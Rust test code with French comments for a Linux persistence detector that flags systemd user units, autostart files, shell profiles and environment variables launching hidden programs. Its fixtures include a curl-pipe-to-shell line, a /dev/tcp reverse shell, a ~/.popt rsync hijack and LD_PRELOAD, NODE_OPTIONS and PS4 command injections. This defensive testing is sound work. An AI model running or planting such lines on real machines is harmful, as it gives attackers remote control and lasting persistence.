            // Le service de la sauvegarde ajouté : levé, et rien d'autre (les autres unités restent muettes).
            m.ecrire(&format!(".config/systemd/user/{}", service.0), &service.1);
            let leves: Vec<String> = juger()
                .into_iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| c.message)
                .collect();
            let [message] = &leves[..] else {
                panic!("{exe}, fat {fat}, anglais {anglais} : un seul constat attendu : {leves:?}");
            };
            assert!(
                message.matches("~/.config/systemd/user/").count()
                    == message
                        .matches(&format!("~/.config/systemd/user/{}:", service.0))
                        .count()
                    && message.contains(&service.0),
                "{exe}, fat {fat}, anglais {anglais} : seule la sauvegarde est levée : {message}"
            );
        }
    }

    /// D-1 (relecture 0.94) : rsync lit ~/.popt au départ, un fichier que le compte écrit, où une ligne
    /// « rsync exec -a /chemin/programme » lui fait lancer ce programme à la place de la copie. Le texte de l'unité ne
    /// dit donc pas ce qu'elle lance : la sauvegarde que Vanguard pose n'est plus tue du tout (sa reconnaissance part à
    /// une version suivante). L'unité exacte, FAT et non FAT, disque branché ou non, avec ou sans ~/.popt, est levée
    /// (Élevé, jamais déclarable : sa ligne ExecStart nommée) ; l'unité hostile de S-1 aussi.
    #[test]
    fn la_sauvegarde_de_vanguard_est_levee() {
        use std::os::unix::fs::PermissionsExt as _;
        let mut faux = Vec::new();
        for fat in [false, true] {
            for branche in [true, false] {
                for popt in [false, true] {
                    let m = Maison::nouvelle(&format!("sauvegarde-levee-{fat}-{branche}-{popt}"));
                    for p in ["rsync", "findmnt"] {
                        let f = m.racine.join("usr/bin").join(p);
                        std::fs::write(&f, "#!/bin/sh\n").unwrap();
                        std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
                    }
                    std::fs::create_dir_all(m.chemin("Documents")).unwrap();
                    let racine = m.racine.join("run/media/alice/Mon disque");
                    if branche {
                        std::fs::create_dir_all(racine.join("Sauvegarde-Vanguard/poste")).unwrap();
                    }
                    if popt {
                        let option = if fat { "-r" } else { "-a" };
                        m.ecrire(".popt", &format!("rsync exec {option} /home/alice/.cache/charge\n"));
                        m.ecrire(".cache/charge", "#!/bin/sh\n");
                    }
                    let (timer, service) = crate::sauvegarde::unites(
                        Path::new("/usr/bin/rsync"),
                        Some(Path::new("/usr/bin/findmnt")),
                        Some("1234-ABCD"),
                        Path::new("/run/media/alice/Mon disque"),
                        Path::new("/run/media/alice/Mon disque/Sauvegarde-Vanguard/poste"),
                        &[std::path::PathBuf::from("/home/alice/Documents")],
                        fat,
                    )
                    .unwrap();
                    m.ecrire(&format!(".config/systemd/user/{}", crate::sauvegarde::TIMER), &timer);
                    m.ecrire(
                        &format!(".config/systemd/user/{}", crate::sauvegarde::SERVICE),
                        &service,
                    );
                    let c = m.lancements();
                    let execstart = service
                        .lines()
                        .position(|l| l.starts_with("ExecStart="))
                        .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1));
                    let nommee = execstart.is_some_and(|e| c.message.contains(&e));
                    if c.probleme != Some(Niveau::Eleve) || !nommee || crate::apprentissage::declarable(&c).is_ok() {
                        faux.push(format!(
                            "fat {fat}, branché {branche}, ~/.popt {popt} : {:?} {:?}",
                            c.probleme, c.message
                        ));
                    }
                }
            }
        }
        // S-1 : la copie hostile du rapport, sous le nom de la sauvegarde.
        let m = Maison::nouvelle("sauvegarde-levee-hostile");
        std::fs::write(m.racine.join("usr/bin/rsync"), "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(m.racine.join("usr/bin/rsync"), std::fs::Permissions::from_mode(0o755)).unwrap();
        m.ecrire(
            &format!(".config/systemd/user/{}", crate::sauvegarde::SERVICE),
            "[Service]\nType=oneshot\nExecStart=/usr/bin/rsync -a /home/alice/Documents/charge/ /home/alice/.config/autostart/\n",
        );
        if m.lancements().probleme != Some(Niveau::Eleve) {
            faux.push("unité hostile de S-1 : muette".to_string());
        }
        assert!(faux.is_empty(), "la sauvegarde de Vanguard doit être levée : {faux:#?}");
    }

    /// COMP-3, la forme exacte : un pourcentage de ressource (chiffres, décimale facultative, « % ») se lit ; toute
    /// autre valeur à « % » d'une clé de ressource reste non lue. rsync reste un lanceur à toutes ses formes, celles
    /// de la sauvegarde comprises (S-1, D-1 : il lit ~/.popt).
    #[test]
    fn un_pourcentage_de_ressource_se_lit_et_rsync_reste_un_lanceur() {
        use std::os::unix::fs::PermissionsExt as _;
        let cas: &[(&str, &str, bool)] = &[
            ("CPUQuota=20%", "/usr/bin/true", true),
            ("CPUQuota=12.5%", "/usr/bin/true", true),
            ("MemoryMax=80%", "/usr/bin/true", true),
            ("TasksMax=15%", "/usr/bin/true", true),
            ("ManagedOOMMemoryPressureLimit=60%", "/usr/bin/true", true),
            ("MemoryMax=256M", "/usr/bin/true", true),
            ("CPUQuota=%h", "/usr/bin/true", false),
            ("CPUQuota=20%%", "/usr/bin/true", false),
            ("CPUQuota=%20", "/usr/bin/true", false),
            ("CPUQuota=20%h", "/usr/bin/true", false),
            ("CPUQuota=.5%", "/usr/bin/true", false),
            ("CPUQuota=5.%", "/usr/bin/true", false),
            ("CPUQuota=-5%", "/usr/bin/true", false),
            ("MemoryMax=%t/x%", "/usr/bin/true", false),
            // S-1 (relecture 0.94) : aucune règle générale sur rsync. L'unité hostile du rapport, et la même copie
            // aux options exactes de la sauvegarde, restent des lanceurs.
            (
                "Nice=10",
                "/usr/bin/rsync -a /home/alice/Documents/charge/ /home/alice/.config/autostart/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a /home/alice/Documents/charge/ /home/alice/.config/systemd/user/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a --no-specials --no-devices --exclude=.cache --exclude=node_modules --exclude=.vanguard-copie-en-cours /home/alice/Documents /run/media/alice/Cle/Sauvegarde-Vanguard/pc/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -rt --modify-window=2 /home/alice/Documents /mnt/x/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a -e ssh /home/alice/Documents /mnt/x/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a --rsh=ssh /home/alice/Documents /mnt/x/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a --rsync-path=/tmp/x /home/alice/Documents /mnt/x/",
                false,
            ),
            ("Nice=10", "/usr/bin/rsync -a /home/alice/Documents hote:/x/", false),
            (
                "Nice=10",
                "/usr/bin/rsync -a --filter=merge_/x /home/alice/Documents /mnt/x/",
                false,
            ),
            (
                "Nice=10",
                "/usr/bin/rsync -a --modify-window=x /home/alice/Documents /mnt/x/",
                false,
            ),
        ];
        for (i, (ligne, exec, sain)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("pourcentage-{i}"));
            for p in ["usr/bin/true", "usr/bin/rsync"] {
                let f = m.racine.join(p);
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                std::fs::write(&f, "#!/bin/sh\n").unwrap();
                std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
            }
            m.ecrire(
                ".config/systemd/user/essai.service",
                &format!("[Unit]\nDescription=essai\n\n[Service]\nExecStart={exec}\n{ligne}\n\n[Install]\nWantedBy=default.target\n"),
            );
            let constats = persistance_dans(
                &m.racine,
                &m.chemin(""),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            );
            let leve: Vec<_> = constats
                .iter()
                .filter(|c| c.probleme.is_some())
                .map(|c| &c.message)
                .collect();
            assert_eq!(leve.is_empty(), *sain, "{ligne} / {exec} : {leve:?}");
        }
    }

    /// Le cas qui a mené à ce lot (valeurs inventées) : une unité de l'utilisateur lance un programme d'un dossier
    /// caché, à corriger soi-même. Elle se déclare normale, montre sa ligne, son fichier et le programme lancé ; le
    /// même état relu au bilan suivant est tu.
    #[test]
    fn unite_de_l_utilisateur_declarable() {
        use crate::machine::temoins::Temoins;
        let m = maison_avec_rappel("declarable");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        let k = c.correctif.as_ref().unwrap();
        assert!(!k.automatique, "une ligne du dossier personnel reste à la main");
        let Temoins::Releves(_) = c.temoins() else {
            panic!("{:?}", c.temoins());
        };
        let lignes = c.temoins().lignes();
        assert_eq!(lignes.len(), 1);
        assert_eq!(lignes[0].ou, "~/.config/systemd/user/rappel.service:6");
        assert_eq!(lignes[0].ligne, "ExecStart=%h/.cache-x/rappel.sh");
        assert!(lignes[0].contenant.is_some());
        assert_eq!(lignes[0].cibles.len(), 2);
        assert_eq!(lignes[0].cibles[0].chemin, "~/.cache-x/rappel.sh");
        assert_eq!(
            lignes[0].cibles[1].chemin, ENVIRONNEMENT,
            "l'environnement des sessions est lié"
        );
        assert!(crate::apprentissage::declarable(&c).is_ok());
        let encore = m.lancements();
        assert_eq!(c.temoins().empreinte(), encore.temoins().empreinte());
        assert!(crate::apprentissage::essai_tait(&c, &encore));
    }

    /// Le modèle de menace du lot, cas par cas : après un choix « normal », chaque changement fait revenir l'alerte.
    #[test]
    fn tout_changement_fait_revenir_l_alerte() {
        type Changement = fn(&Maison);
        let cas: [(&str, Changement); 26] = [
            ("unité changée", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}Environment=LANG=C\n"),
                );
            }),
            ("unité remplacée par un lien au même contenu", |m| {
                m.ecrire(".local/share/ailleurs.service", UNITE);
                let p = m.chemin(".config/systemd/user/rappel.service");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".local/share/ailleurs.service"), &p).unwrap();
            }),
            ("programme lancé changé", |m| {
                m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl -s http://192.0.2.7/x | sh\n");
            }),
            ("programme lancé remplacé par un lien", |m| {
                m.ecrire(".cache-x/vrai.sh", "#!/bin/sh\necho rappel\n");
                let p = m.chemin(".cache-x/rappel.sh");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".cache-x/vrai.sh"), &p).unwrap();
            }),
            ("programme lancé effacé", |m| {
                std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
            }),
            ("ligne ajoutée dans le même fichier", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}ExecStartPost=%h/.cache-x/autre.sh\n"),
                );
            }),
            ("autre source dans la même alerte", |m| {
                m.ecrire(".config/autostart/maj.desktop", "[Desktop Entry]\nExec=/tmp/.x/agent\n");
            }),
            ("ligne de la crontab dans un fichier lu", |m| {
                m.ecrire(".bashrc", "export LD_PRELOAD=/tmp/.l/libz.so\n");
            }),
            ("ajout (drop-in) posé", |m| {
                m.ecrire(".config/systemd/user/rappel.service.d/x.conf", "[Service]\nNice=5\n");
            }),
            ("ajout de tous les services posé", |m| {
                m.ecrire(".config/systemd/user/service.d/x.conf", "[Service]\nNice=5\n");
            }),
            ("ajout posé dans le dossier de la session", |m| {
                let d = m.racine.join("run/user/1000/systemd/user/rappel.service.d");
                std::fs::create_dir_all(&d).unwrap();
                std::fs::write(d.join("x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            ("même ligne, autre programme", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &UNITE.replace("rappel.sh", "rappel.sh --x"),
                );
            }),
            // Campagne E, F4 : une variable posée pour les sessions change ce que fait la ligne sans toucher à un
            // fichier lié.
            ("variable dans environment.d", |m| {
                m.ecrire(
                    ".config/environment.d/50-x.conf",
                    "BASH_ENV=/home/alice/.cache-x/e.sh
",
                );
            }),
            ("variable par défaut du gestionnaire", |m| {
                m.ecrire(
                    ".config/systemd/user.conf.d/x.conf",
                    "[Manager]\nDefaultEnvironment=PYTHONPATH=/home/alice/.cache-x\n",
                );
            }),
            ("variable de Hyprland", |m| {
                m.ecrire(
                    ".config/hypr/hyprland.conf",
                    "env = NODE_OPTIONS,--require=/home/alice/.e.js\n",
                );
            }),
            ("variable d'un profil", |m| {
                m.ecrire(".profile", "export PS4='$(id)'\n");
            }),
            ("variable de pam_env", |m| {
                m.ecrire(".pam_environment", "PYTHONSTARTUP DEFAULT=/home/alice/.e.py\n");
            }),
            // F5 : un alias de l'unité et son ajout, dans le dossier de la session.
            ("ajout posé sous un alias", |m| {
                let d = m.racine.join("run/user/1000/systemd/user");
                std::fs::create_dir_all(d.join("alias.service.d")).unwrap();
                std::os::unix::fs::symlink(m.chemin(".config/systemd/user/rappel.service"), d.join("alias.service"))
                    .unwrap();
                std::fs::write(d.join("alias.service.d/x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // M-d : le dossier d'exécution de systemd pour les unités de l'utilisateur.
            ("ajout posé dans /run/systemd/user", |m| {
                let d = m.racine.join("run/systemd/user/rappel.service.d");
                std::fs::create_dir_all(&d).unwrap();
                std::fs::write(d.join("x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // M-c : execr-once d'Hyprland.
            ("execr-once d'Hyprland", |m| {
                m.ecrire(".config/hypr/autostart.conf", "execr-once = /tmp/.x/agent\n");
            }),
            // Vérification de la campagne E, N6 : un alias d'alias, nommé par des liens relatifs, et son ajout.
            ("ajout posé sous un alias d'alias", |m| {
                let d = m.racine.join("run/user/1000/systemd/user");
                std::fs::create_dir_all(d.join("alias2.service.d")).unwrap();
                std::os::unix::fs::symlink("rappel.service", d.join("alias.service")).unwrap();
                std::os::unix::fs::symlink("alias.service", d.join("alias2.service")).unwrap();
                std::fs::write(d.join("alias2.service.d/x.conf"), "[Service]\nNice=5\n").unwrap();
            }),
            // N3 : les fichiers des variables liés en entier, ceux que lisent bash, zsh et fish compris.
            ("commentaire d'un profil", |m| m.ecrire(".bashrc", "# note\n")),
            ("bash_login", |m| m.ecrire(".bash_login", "export GTK_MODULES=x\n")),
            ("zlogin", |m| m.ecrire(".zlogin", "export GTK_MODULES=x\n")),
            ("configuration de fish", |m| {
                m.ecrire(".config/fish/conf.d/x.fish", "set -gx GTK_MODULES x\n");
            }),
            ("variable de Hyprland par un autre dossier", |m| {
                m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/v.conf\n");
                m.ecrire(".autres/v.conf", "env = GTK_MODULES,x\n");
            }),
        ];
        for (nom, changer) in cas {
            let m = maison_avec_rappel(&format!("revient-{}", nom.len()));
            let declare = m.lancements();
            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{nom}");
            changer(&m);
            let plus_tard = m.lancements();
            assert!(plus_tard.probleme >= Some(Niveau::Eleve), "{nom}");
            assert_ne!(declare.temoins().empreinte(), plus_tard.temoins().empreinte(), "{nom}");
            assert!(
                !crate::apprentissage::essai_tait(&declare, &plus_tard),
                "{nom} : l'alerte doit revenir"
            );
        }
    }

    /// Ce qui ne se relève pas ne se déclare pas normal : une commande ambiguë, un programme illisible, plus de
    /// lignes qu'on n'en montre ; un shell inversé non plus. Et une alerte qui ne se relève plus n'est plus tue.
    #[test]
    fn releves_refuses() {
        use crate::machine::temoins::{TEMOINS_MAX, Temoins};
        let refuse = |m: &Maison| matches!(m.lancements().temoins(), Temoins::Refuse(_));
        let m = Maison::nouvelle("ambigu");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nExecStart=%h/.x/run $ARGUMENTS\n",
        );
        assert!(refuse(&m));
        assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
        let m = Maison::nouvelle("inverse");
        m.ecrire(".bashrc", "bash -i >& /dev/tcp/192.0.2.7/4444 0>&1\n");
        assert!(refuse(&m));
        let m = Maison::nouvelle("trop");
        let unite = (0..=TEMOINS_MAX).fold(String::new(), |mut u, i| {
            u.push_str("ExecStartPre=%h/.x/etape");
            u.push_str(&i.to_string());
            u.push('\n');
            u
        });
        m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{unite}"));
        assert!(refuse(&m));
        // Le programme devenu illisible (un dossier à sa place) : le choix d'hier ne tait plus rien.
        let m = maison_avec_rappel("illisible");
        let declare = m.lancements();
        std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
        std::fs::create_dir_all(m.chemin(".cache-x/rappel.sh")).unwrap();
        let plus_tard = m.lancements();
        assert!(matches!(plus_tard.temoins(), Temoins::Refuse(_)));
        assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard));
    }

    /// Le refus d'une alerte, tel qu'il se montre.
    /// Campagne E, F1 : un octet qui n'est pas de l'UTF-8 dans un fichier de démarrage ou d'environnement : la
    /// ligne ne se déclare pas (lue « avec pertes », elle montrerait et suivrait un autre fichier que celui lancé).
    #[test]
    fn octet_illisible_jamais_declarable() {
        let sources: [(&str, &[u8]); 5] = [
            (
                ".config/systemd/user/rappel.service",
                b"[Service]\nExecStart=%h/.cache-x/rap\xffpel.sh\n",
            ),
            (
                ".config/autostart/maj.desktop",
                b"[Desktop Entry]\nExec=/tmp/.x/ag\xffent\n",
            ),
            (".config/hypr/autostart.conf", b"exec-once = /tmp/.x/ag\xffent\n"),
            (".bashrc", b"export LD_PRELOAD=/tmp/.l/li\xffbz.so\n"),
            (".config/environment.d/50-x.conf", b"LANG=fr\xff\n"),
        ];
        for (i, (fichier, octets)) in sources.into_iter().enumerate() {
            let m = maison_avec_rappel(&format!("octet-{i}"));
            let p = m.chemin(fichier);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, octets).unwrap();
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{fichier}");
            assert!(crate::apprentissage::declarable(&c).is_err(), "{fichier}");
        }
    }

    /// Les variables des sessions liées en entier (vérification de la campagne E, N3) : tout changement d'un de
    /// leurs fichiers, même un commentaire, fait revenir l'alerte ; plus de liste de noms à contourner.
    #[test]
    fn variables_des_sessions_liees_en_entier() {
        for (i, (fichier, texte)) in [
            (".config/environment.d/50-x.conf", "# note\n"),
            (".config/environment.d/50-x.conf", "GTK_MODULES=/tmp/x\n"),
            (".config/environment.d/50-x.conf", "PYTHON\\x5fPATH=/x\n"),
            (".pam_environment", "GDK_PIXBUF_MODULE_FILE DEFAULT=/tmp/x\n"),
            (
                ".config/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=BASH_FUNC_x%%=()\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("variables-{i}"));
            let declare = m.lancements();
            m.ecrire(fichier, texte);
            assert!(
                !crate::apprentissage::essai_tait(&declare, &m.lancements()),
                "{fichier} {texte:?}"
            );
        }
    }

    /// Campagne E, M-f : un dossier personnel relatif ne passe jamais pour « rien de suspect ».
    #[test]
    fn dossier_personnel_relatif_dit() {
        let m = maison_avec_rappel("relatif");
        let c = persistance_dans(&m.racine, Path::new("maison"), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(
            c.message.contains("dossier personnel inconnu ou relatif"),
            "{}",
            c.message
        );
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// Vérification de la campagne E, N3 : un fichier que lit un fichier des variables (« source = » de Hyprland,
    /// « . » d'un profil) est lié aussi ; un « source = » calculé de Hyprland ne se suit pas, et rien ne se déclare.
    #[test]
    fn sources_des_variables_suivies() {
        for (i, (fichier, texte, lu)) in [
            (
                ".config/hypr/hyprland.conf",
                "source = ~/.autres/v.conf\n",
                ".autres/v.conf",
            ),
            (
                ".config/hypr/hyprland.conf",
                "source=/home/alice/.autres/v.conf # x\n",
                ".autres/v.conf",
            ),
            // Un chemin relatif se lit depuis le dossier du fichier, comme Hyprland (relecture adverse, C7).
            (
                ".config/hypr/hyprland.conf",
                "source = ../../.autres/r.conf\n",
                ".autres/r.conf",
            ),
            (".profile", ". ~/.autres/p.sh\n", ".autres/p.sh"),
            (".bashrc", "source \"$HOME/.autres/p.sh\"\n", ".autres/p.sh"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("sources-{i}"));
            m.ecrire(fichier, texte);
            m.ecrire(lu, "# rien\n");
            let declare = m.lancements();
            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
            m.ecrire(lu, "# autre chose\n");
            assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
        }
        for (i, texte) in [
            "source = $HOME/x.conf\n",
            "source = ~/.*/v.conf\n",
            "source = ~/.autres/{a,b}.conf\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("sources-calculees-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte}");
            assert!(refus(&c).contains("toutes lettres"), "{texte} : {}", refus(&c));
        }
        // Un profil qui se lit lui-même : la chaîne s'arrête, rien ne tourne sans fin.
        let m = maison_avec_rappel("sources-boucle");
        m.ecrire(".profile", ". ~/.profile\n");
        assert!(crate::apprentissage::essai_tait(&m.lancements(), &m.lancements()));
    }

    /// Vérification de la campagne E, « -mmodule » : un interpréteur du système copié sous un autre nom lit ce que ses
    /// options lui donnent, que rien ne lie ; la ligne ne se déclare pas. Un autre programme de même taille, si.
    #[test]
    fn copie_d_un_interprete_refusee() {
        let m = Maison::nouvelle("copie");
        let bin = m.racine.join("usr/bin");
        std::fs::create_dir_all(&bin).unwrap();
        std::fs::write(bin.join("python3"), b"\x7fELF\x02\x01\x01\x00\x00 interprete").unwrap();
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nExecStart=%h/.x/outil -mrappel\n",
        );
        std::fs::create_dir_all(m.chemin(".x")).unwrap();
        std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 interprete").unwrap();
        let c = m.lancements();
        assert!(crate::apprentissage::declarable(&c).is_err());
        assert!(refus(&c).contains("copie de /usr/bin/python3"), "{}", refus(&c));
        std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 autre-prog").unwrap();
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
        // Un lien dur, même sans lire le contenu.
        std::fs::remove_file(m.chemin(".x/outil")).unwrap();
        if std::fs::hard_link(bin.join("python3"), m.chemin(".x/outil")).is_ok() {
            assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
        }
        // Deuxième vérification : un interpréteur de même taille qui ne se relit pas ne fait pas conclure « pas une
        // copie ».
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::remove_file(m.chemin(".x/outil")).unwrap();
            std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 autre-prog").unwrap();
            std::fs::write(bin.join("python3"), b"\x7fELF\x02\x01\x01\x00\x00 interpret2").unwrap();
            std::fs::set_permissions(bin.join("python3"), std::fs::Permissions::from_mode(0o000)).unwrap();
            if std::fs::read(bin.join("python3")).is_ok() {
                return crate::essais::saute("le compte lit un fichier sans droit de lecture (root)");
            }
            let c = m.lancements();
            std::fs::set_permissions(bin.join("python3"), std::fs::Permissions::from_mode(0o644)).unwrap();
            assert!(refus(&c).contains("ne se compare pas"), "{}", refus(&c));
        }
    }

    /// Vérification de la campagne E, N7 : une unité posée sous un XDG_CONFIG_HOME ou un XDG_DATA_HOME déplacé est
    /// cherchée comme les autres (systemd l'y lit), et ne passe pas pour « rien de suspect ».
    #[test]
    fn unites_des_dossiers_deplaces_vues() {
        for (variable, dossier) in [("XDG_CONFIG_HOME", "systemd/user"), ("XDG_DATA_HOME", "systemd/user")] {
            let m = Maison::nouvelle(&format!("deplace-{}", variable.len() + dossier.len()));
            let ailleurs = m.racine.join("ailleurs");
            let vars = |v: &str| match v {
                "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
                x if x == variable => Some("/ailleurs".into()),
                _ => None,
            };
            let lire = || {
                persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
                    .into_iter()
                    .next()
                    .unwrap()
            };
            assert_eq!(lire().probleme, None, "{variable}");
            std::fs::create_dir_all(ailleurs.join(dossier)).unwrap();
            std::fs::write(ailleurs.join(dossier).join("rappel.service"), UNITE).unwrap();
            m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
            assert!(lire().probleme >= Some(Niveau::Eleve), "{variable}");
        }
        // Le dossier de démarrage du bureau d'une configuration déplacée aussi.
        let m = Maison::nouvelle("deplace-bureau");
        let vars = |v: &str| (v == "XDG_CONFIG_HOME").then(|| "/ailleurs".into());
        std::fs::create_dir_all(m.racine.join("ailleurs/autostart")).unwrap();
        std::fs::write(
            m.racine.join("ailleurs/autostart/maj.desktop"),
            "[Desktop Entry]\nExec=/tmp/.x/agent\n",
        )
        .unwrap();
        let c = persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve));
    }

    /// Vérification de la campagne E, N9 : un dossier personnel que le compte ne peut pas lire n'est pas « rien de
    /// suspect », mais « non vérifié ».
    #[cfg(unix)]
    #[test]
    fn dossier_personnel_illisible_dit() {
        use std::os::unix::fs::PermissionsExt as _;
        let m = Maison::nouvelle("illisible-maison");
        let maison = m.chemin("");
        std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o000)).unwrap();
        if std::fs::read_dir(&maison).is_ok() {
            std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o755)).unwrap();
            return crate::essais::saute("le compte lit un dossier sans droit de lecture (root)");
        }
        let c = m.lancements();
        std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(c.message.contains("dossier personnel ne se lit pas"), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// Campagne E, M-d : un XDG_CONFIG_HOME déplacé est lu, ses unités et ses variables comprises.
    #[test]
    fn configuration_deplacee_lue() {
        let m = maison_avec_rappel("deplacee");
        let ailleurs = m.racine.join("ailleurs");
        let vars = |v: &str| match v {
            "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
            "XDG_CONFIG_HOME" => Some("/ailleurs".into()),
            _ => None,
        };
        let lire = || {
            persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
                .into_iter()
                .next()
                .unwrap()
        };
        let declare = lire();
        assert!(crate::apprentissage::essai_tait(&declare, &lire()));
        std::fs::create_dir_all(ailleurs.join("systemd/user/rappel.service.d")).unwrap();
        std::fs::write(
            ailleurs.join("systemd/user/rappel.service.d/x.conf"),
            "[Service]\nNice=5\n",
        )
        .unwrap();
        assert!(
            !crate::apprentissage::essai_tait(&declare, &lire()),
            "ajout sous XDG_CONFIG_HOME"
        );
        std::fs::remove_dir_all(ailleurs.join("systemd")).unwrap();
        assert!(crate::apprentissage::essai_tait(&declare, &lire()));
        std::fs::create_dir_all(ailleurs.join("environment.d")).unwrap();
        std::fs::write(ailleurs.join("environment.d/x.conf"), "NODE_OPTIONS=--require=/x.js\n").unwrap();
        assert!(
            !crate::apprentissage::essai_tait(&declare, &lire()),
            "variable sous XDG_CONFIG_HOME"
        );
    }

    fn refus(c: &Constat) -> String {
        match c.temoins() {
            crate::machine::temoins::Temoins::Refuse(r) => r.clone(),
            autre => panic!("refus attendu : {autre:?}"),
        }
    }

    /// Relecture E, C2 : ce qui redirige une ligne acceptée sans toucher aux fichiers liés ne se déclare pas normal ;
    /// un ajout (drop-in) qui change le dossier personnel, les bibliothèques ou les variables, une unité du même nom
    /// qui passe avant, même écrit sur des lignes continuées.
    #[test]
    fn unite_redirigee_refusee() {
        let cas: [(&str, &str, &str); 10] = [
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironment=HOME=/tmp/h\n",
                "HOME",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironmentFile=%h/.e\n",
                "EnvironmentFile",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironment=\"LANG=C\" \\\n  LD_PRELOAD=/tmp/l.so\n",
                "LD_PRELOAD",
            ),
            (
                "service.d/x.conf",
                "[Service]\nEnvironment=PYTHONPATH=/tmp\n",
                "PYTHONPATH",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nExecSearchPath=/tmp\n",
                "ExecSearchPath",
            ),
            // Vérification de la campagne E, N1 : le dossier de travail change ce que lit « /proc/self/cwd/… » et
            // tout chemin relatif d'un programme.
            (
                "rappel.service.d/x.conf",
                "[Service]\nWorkingDirectory=/tmp\n",
                "WorkingDirectory",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nRootDirectory=/tmp\n",
                "RootDirectory",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nTemporaryFileSystem=/opt\n",
                "TemporaryFileSystem",
            ),
            ("../user.control/rappel.service", UNITE, "user.control"),
            // Campagne E : l'entrée standard d'un service peut porter le script que lit un interpréteur.
            (
                "rappel.service.d/x.conf",
                "[Service]\nStandardInputText=curl http://192.0.2.7/x\n",
                "StandardInput",
            ),
        ];
        for (fichier, texte, attendu) in cas {
            let m = maison_avec_rappel(&format!("redirigee-{attendu}"));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok(), "{attendu}");
            m.ecrire(&format!(".config/systemd/user/{fichier}"), texte);
            let plus_tard = m.lancements();
            assert!(refus(&plus_tard).contains(attendu), "{attendu} : {}", refus(&plus_tard));
            assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard), "{attendu}");
        }
        // Sans dossier de la session, ce que systemd y ajouterait ne se vérifie pas.
        let m = maison_avec_rappel("sans-session");
        let c = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(refus(&c).contains("XDG_RUNTIME_DIR"));
    }

